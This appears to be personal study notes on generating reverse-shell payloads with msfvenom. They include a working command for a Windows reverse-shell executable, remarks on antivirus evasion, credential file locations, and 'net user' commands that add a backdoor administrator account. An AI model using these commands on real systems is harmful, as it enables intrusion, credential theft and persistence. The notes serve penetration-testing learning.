## Introduction
- Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.
- however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).

**The standard syntax for msfvenom is as follows:**
```python
msfvenom -p <PAYLOAD> <OPTIONS>
```
**Example**
to generate a Windows x64 Reverse Shell in an exe format, we could use:
```python
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
![[shells12.png]]
**Here we are using a payload and four options:**
- **-f** format
	- Specifies the output format. In this case that is an executable (exe)
- **-o** file
	- The output location and filename for the generated payload.
- **LHOST**=IP
	- Specifies the IP to connect back to.
- **LPORT**=port
	- The port on the local machine to connect back to.

**Note** - The port can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.  

### Staged vs Stageless
_**staged**_ reverse shell payloads and _**stageless**_ reverse shell payloads.

##### Staged reverse shell payload:
- _**Staged**_ payloads are sent in two parts.
- the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code.
- The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- The reverse shell code which is downloaded when the stager is activated.
- Staged payloads require a special listener -- usually the Metasploit multi/handler.
- Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software.
##### Stageless:
- They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
- They are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.

### Payload Naming Conventions
The basic convention is as follows:
```python
<OS>/<arch>/<payload>
```
**Example:**
```python
linux/x86/shell_reverse_tcp
```
This would generate a stageless reverse shell for an x86 Linux target.

**The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:**
```python
windows/shell_reverse_tcp
```
- For a 64bit Windows target, the arch would be specified as normal (x64).

#### Identifying whether the payload is staged or stageless
- Stageless payloads are denoted with underscores (`_`). In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload.
**The staged equivalent to this payload would be:**
```python
shell/reverse_tcp
```
As staged payloads are denoted with another forward slash (`/`).

##### Same Stage and stageless rule apply in meterpreter
A Windows 64bit staged Meterpreter payload would look like this:
```python
windows/x64/meterpreter/reverse_tcp
```

A Linux 32bit stageless Meterpreter payload would look like this:
```python
linux/x86/meterpreter_reverse_tcp
```

## List payloads in msfvenom
```python
msfvenom --list payloads
```

The above command can then be piped into `grep` to search for a specific set of payloads.
![[shells13.png]]
This gives us a full set of Linux meterpreter payloads for 32bit targets.

## Next steps
We already know all the shells are by default unstable and non-interactive.

**On Linux**
ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this.

**On windows**
Some versions of the FileZilla FTP server also leave credentials in an XML file at
`C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

